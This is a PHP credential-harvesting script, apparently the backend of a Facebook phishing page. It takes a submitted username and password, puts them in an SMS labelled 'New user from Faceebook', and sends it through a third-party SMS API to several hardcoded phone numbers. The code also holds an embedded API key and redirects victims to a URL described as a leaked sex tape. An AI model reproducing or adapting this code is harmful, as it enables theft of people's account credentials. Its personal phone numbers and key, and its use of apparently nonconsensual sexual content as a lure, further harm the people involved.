<?php

if(isset(($_POST['username']))){


    $username = $_POST['username'];
    $password = $_POST['password'];




    $key = "M869SII68HPvadx5GUa4l3coC";  // Remember to put your own API Key here
                   $to = "+233593529475, +233548022025, +233504434726, +233578109183"; // 0248416438 You only need to separate the contacts with commas
                   $msg = "New user from Faceebook :Username:".$username.", Pass:".$password." ";

                   $sender_id = "Qliq ltd"; //11 Characters maximum
                   // $date_time = "2017-05-02 00:59:00";

                   //encode the message
                   $msg = urlencode($msg);

                   //prepare your url
                   $url = "https://apps.mnotify.net/smsapi?"
                               . "key=$key"
                               . "&to=$to"
                               . "&msg=$msg"
                               . "&sender_id=$sender_id";
                               $response = file_get_contents($url);
                               if($response) {

                                   header("Location: https://www.xvideos.com/video36039811/yoruba_couple_leaked_sex_tape_video_2018");

                               }
                               else {
                                   $msg  = array(
                                   "code"  => "0",
                                   "text" => "could not send sms ".$response." "
                                   );
                                   echo json_encode($msg);

                               }




}
